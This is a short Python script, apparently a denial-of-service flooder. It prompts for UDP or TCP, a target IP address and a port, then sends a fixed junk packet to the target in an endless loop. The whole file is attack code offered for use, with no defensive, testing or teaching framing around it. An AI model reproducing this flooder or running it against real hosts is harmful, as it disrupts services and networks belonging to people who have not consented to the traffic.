import socket

print('1) UDP\n'
      '2) TCP')
type_att = input('Option: ')
ip = input('IP: ')
port = int(input('PORT: '))
packet = b"<packet></packet>\0<2packet></2packet>"

# DGRAM
def udp():
    global ip
    global port
    global packet

    print('\nUDP type selected!')
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        client.connect((ip, port))
    except Exception as e:
        print(str(e))

    while True:
        try:
            client.send(packet)
        except Exception as e:
            print(str(e))


# STREAM
def tcp():
    global ip
    global port
    global packet

    print('\nTCP type selected!')

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((ip, port))
    except Exception as e:
        print(str(e))

    while True:
        try:
            client.send(packet)
        except Exception as e:
            print(str(e))


if type_att == '1':
    udp()
elif type_att == '2':
    tcp()
else:
    print('\nERROR: Wrong type selected!')
